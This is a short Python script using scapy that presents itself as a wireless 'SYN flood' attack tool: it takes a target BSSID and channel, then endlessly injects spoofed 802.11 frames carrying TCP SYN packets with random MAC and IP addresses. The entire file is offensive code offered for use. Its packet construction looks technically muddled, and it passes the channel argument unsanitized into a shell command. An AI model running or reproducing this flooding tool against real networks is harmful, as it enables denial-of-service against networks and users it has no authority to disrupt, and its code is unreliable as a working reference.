#!/usr/bin/env python

import sys
import getopt
from scapy.all import *
import os

# Function to perform SYN Flood attack
def syn_flood(target_mac, channel):
    # Set the channel of the wireless interface
    os.system("iwconfig " + conf.iface + " channel " + channel)

    # Create a TCP SYN packet
    packet = RadioTap()/Dot11(type=2, subtype=0, addr1="ff:ff:ff:ff:ff:ff", addr2=RandMAC(), addr3=target_mac)/IP(dst=RandIP())/TCP(sport=RandShort(), dport=80, flags="S")

    # Send the packet in a loop
    try:
        sendp(packet, inter=0.001, loop=1, verbose=1)
    except KeyboardInterrupt:
        print("\nSYN Flood attack stopped.")

# Main function
if __name__ == "__main__":
    # Get command line arguments
    try:
        opts, args = getopt.getopt(sys.argv[1:], "a:c:", ["bssid=", "channel="])
    except getopt.GetoptError:
        print("Usage: sudo python syn-flood.py -a <BSSID> -c <channel>")
        sys.exit(2)

    # Parse command line arguments
    target_mac = None
    channel = None
    for opt, arg in opts:
        if opt in ("-a", "--bssid"):
            target_mac = arg
        elif opt in ("-c", "--channel"):
            channel = arg

    # Check if all required arguments are present
    if not all([target_mac, channel]):
        print("Usage: sudo python syn-flood.py -a <BSSID> -c <channel>")
        sys.exit(2)

    # Perform SYN Flood attack
    syn_flood(target_mac, channel)